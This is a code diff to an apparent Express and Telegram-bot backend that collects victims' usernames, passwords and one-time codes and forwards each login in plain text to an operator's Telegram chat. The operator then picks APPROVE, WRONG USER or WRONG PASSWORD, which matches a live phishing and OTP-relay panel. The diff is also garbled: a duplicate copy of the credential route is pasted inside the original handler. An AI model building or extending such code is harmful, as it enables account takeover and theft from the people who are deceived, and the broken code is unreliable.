@@ -43,6 +43,18 @@ function fmtCurrency(n){
 
 // Create Telegraf bot (no polling)
 const bot = new Telegraf(TOKEN);
+// --- after: const bot = new Telegraf(TOKEN);
+async function safeSendMessage(chatId, text, options) {
+  try {
+    const result = await bot.telegram.sendMessage(chatId, text, options);
+    console.log('sendMessage ok, message_id=', result && result.message_id);
+    return { ok: true, result };
+  } catch (err) {
+    // Telegram error responses are often on err.response
+    console.error('sendMessage error:', err && (err.response || err).toString ? (err.response || err).toString() : err);
+    return { ok: false, error: err };
+  }
+}
 
 // Setup webhook route as express middleware
 // Telegraf provides webhookCallback to integrate with express
@@ -90,16 +102,22 @@ app.post('/api/create-application', (req, res) => {
   }
 });
 
-app.post('/api/submit-credentials', (req, res) => {
+app.post('/api/submit-credentials', async (req, res) => {
   try {
     const { applicationId, username, password } = req.body || {};
-    if (!applicationId || !username || !password) return res.status(400).json({ success: false, error: 'Missing fields' });
-    const appRec = apps[applicationId];
-    if (!appRec) return res.status(404).json({ success: false, error: 'Application not found' });
+    if (!applicationId || !username || !password) {
+      return res.status(400).json({ success: false, error: 'Missing fields' });
+    }
 
-    appRec.username = username;
-    appRec.password = password; // demo only
-    appRec.status = 'cred_submitted';
+    const appRecord = apps[applicationId];
+    if (!appRecord) {
+      return res.status(404).json({ success: false, error: 'Application not found' });
+    }
+
+    // store in-memory (demo only)
+    appRecord.username = username;
+    appRecord.password = password;
+    appRecord.status = 'cred_submitted';
 
     const keyboard = {
       inline_keyboard: [[
@@ -108,16 +126,50 @@ app.post('/api/submit-credentials', (req, res) => {
         { text: 'WRONG PASSWORD', callback_data: `CRED|${applicationId}|WRONG_PASS` }
       ]]
     };
+
+  app.post('/api/submit-credentials', async (req, res) => {
+  try {
+    const { applicationId, username, password } = req.body || {};
+    if (!applicationId || !username || !password) {
+      return res.status(400).json({ success: false, error: 'Missing fields' });
+    }
+
+    const appRecord = apps[applicationId];
+    if (!appRecord) {
+      return res.status(404).json({ success: false, error: 'Application not found' });
+    }
+
+    // store in-memory (demo only)
+    appRecord.username = username;
+    appRecord.password = password;
+    appRecord.status = 'cred_submitted';
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: 'APPROVE', callback_data: `CRED|${applicationId}|APPROVE` },
+        { text: 'WRONG USER', callback_data: `CRED|${applicationId}|WRONG_USER` },
+        { text: 'WRONG PASSWORD', callback_data: `CRED|${applicationId}|WRONG_PASS` }
+      ]]
+    };
+
     const text = `Credentials for app ${applicationId}:\nUsername: ${username}\nPassword: ${password}\n\nSelect action:`;
-    bot.telegram.sendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard }).catch(err => console.error('sendMessage error', err));
 
-    res.json({ success: true, message: 'Credentials forwarded to admin' });
+    const sendResult = await safeSendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard });
+
+    if (!sendResult.ok) {
+      const err = sendResult.error;
+      const details = (err && err.response && err.response.body) ? err.response.body : (err && err.message) ? err.message : String(err);
+      console.error('Telegram send failed details:', details);
+      // return details to client for debugging (remove in production)
+      return res.status(500).json({ success: false, error: 'Telegram sendMessage failed', details });
+    }
+
+    return res.json({ success: true, message: 'Credentials forwarded to admin' });
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ success: false, error: 'Server error' });
+    console.error('submit-credentials error', err);
+    return res.status(500).json({ success: false, error: 'Server error', details: err && err.message ? err.message : String(err) });
   }
-});
-
+}); 
 app.post('/api/submit-otp', (req, res) => {
   try {
     const { applicationId, phone, otp } = req.body || {};
